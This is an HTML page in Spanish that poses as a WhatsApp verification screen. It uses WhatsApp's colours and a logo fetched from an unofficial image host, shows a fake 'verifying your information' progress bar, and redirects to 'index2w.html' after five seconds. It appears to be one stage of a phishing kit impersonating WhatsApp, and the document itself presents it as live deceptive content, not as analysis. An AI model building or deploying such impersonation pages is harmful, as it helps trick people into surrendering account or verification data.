<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación - WhatsApp</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #075E54; /* Verde WhatsApp oficial */
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        
        .loading-container {
            width: 90%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 25px;
        }
        
        .logo {
            width: 120px;
            height: auto;
            margin-bottom: 10px;
        }
        
        .status-text {
            font-size: 18px;
            font-weight: 500;
            margin: 0;
        }
        
        .progress-container {
            width: 100%;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            height: 6px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0;
            background-color: white;
            animation: progress 5s linear forwards;
        }
        
        .loading-message {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 10px;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-top: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <img src="https://sappsapp23.sirv.com/docs/JvsnINJ2CZv.svg" alt="WhatsApp" class="logo">
        <p class="status-text">Verificando tu información...</p>
        
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        
        <p class="loading-message">Por favor espera, esto puede tomar unos momentos</p>
        
        <div class="spinner"></div>
    </div>

    <script>
        setTimeout(() => {
            window.location.href = "index2w.html";
        }, 5000);
    </script>
</body>
</html>
